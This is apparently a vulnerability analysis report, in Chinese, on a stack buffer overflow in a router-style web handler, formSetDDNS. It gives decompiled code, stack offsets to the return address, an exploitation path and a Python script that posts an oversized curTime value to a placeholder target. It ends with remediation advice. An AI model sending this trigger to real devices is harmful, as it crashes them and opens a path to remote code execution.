# 栈溢出漏洞分析报告 - formSetDDNS

## 漏洞概览
- **漏洞类型**: 栈缓冲区溢出 (Stack Buffer Overflow)
- **风险等级**: 高危 (High)
- **受影响函数**: `formSetDDNS` (地址: 0x466fdc)
- **触发条件**: 通过HTTP请求向`curTime`参数传入超长字符串

## 漏洞详情

### 漏洞点1 - sprintf格式化字符串溢出 (高危)
#### 代码片段
```c
sprintf(v31, "/Tools/Dynamic_DNS.asp?t=%s", v28);
```
**位置**: 地址 0x467720

#### 根因分析
- **目标缓冲区**: `v31[128]` (栈上缓冲区)
- **用户输入**: `curTime` 参数 (v28变量)
- **无长度检查**: 使用`sprintf`直接格式化，无边界检查
- **栈溢出风险**: 固定大小缓冲区可能被超长输入溢出

### 漏洞点2 - 错误消息复制到全局缓冲区 (高危)
#### 代码片段
```c
strcpy(&err_msg, v30);
```
**位置**: 地址 0x4676e4

#### 根因分析
- **目标缓冲区**: `err_msg` (全局错误消息缓冲区)
- **源缓冲区**: `v30[104]` (栈上缓冲区)
- **双重溢出风险**: 如果`v30`被溢出，会进一步溢出全局变量

### 漏洞点3 - 字符串复制操作 (中危)
#### 代码片段
```c
strcpy(v30, "Set DDNS Type error!");
```
**位置**: 地址 0x467234

#### 根因分析
- **目标缓冲区**: `v30[104]` (栈上缓冲区)
- **固定字符串**: 虽然使用固定字符串，但存在模式可被利用

## 栈帧布局计算
- **栈帧总大小**: 0x124 (292字节)
- **返回地址偏移**: 0x120 (288字节)
- **关键缓冲区**:
  - `v30[104]`: 偏移 0x18-0x80
  - `v31[128]`: 偏移 0x80-0x100
  - `v32[24]`: 偏移 0x100-0x118

## 利用分析

### 偏移量计算
- **从v30到返回地址**: 0x120 - 0x18 = 264字节
- **从v31到返回地址**: 0x120 - 0x80 = 160字节
- **从v32到返回地址**: 0x120 - 0x100 = 32字节

### 利用路径
1. **HTTP请求构造**: 通过`curTime`参数传入超长字符串
2. **触发漏洞**: 格式化字符串操作导致栈缓冲区溢出
3. **控制流劫持**: 覆盖返回地址实现代码执行

### 触发脚本
```python
import requests

# 目标URL
url = "http://target-ip/formSetDDNS"

# 构造超长payload触发溢出
payload = 'A' * 200  # 超过缓冲区大小的字符串

data = {
    'curTime': payload,  # 触发漏洞的参数
    'settingsChanged': '1',
    'config.dyndns_enabled': 'true',
    'config.dyndns_server': '1',
    'config.dyndns_user': 'testuser',
    'config.dyndns_pass': 'testpass',
    'config.dyndns_host': 'test.example.com'
}

# 发送触发请求
response = requests.post(url, data=data)
print(f"响应状态: {response.status_code}")
```

## HTTP利用可行性确认
**✅ 确认通过HTTP请求可触发**
- 函数通过`websGetVar`获取HTTP参数
- `curTime`参数直接用于格式化字符串操作
- 可通过恶意HTTP请求触发栈溢出

## 结论与建议

### 修复建议
1. **使用安全函数**: 将`sprintf`替换为`snprintf`，添加长度限制
2. **输入验证**: 对`curTime`参数进行长度检查
3. **边界检查**: 在所有字符串操作前验证缓冲区大小

### 编译保护
- **栈保护**: 启用编译器栈保护选项 (`-fstack-protector`)
- **地址随机化**: 启用ASLR保护机制
- **非执行栈**: 启用NX/DEP保护

此漏洞允许攻击者通过精心构造的HTTP请求实现远程代码执行，风险等级为高危。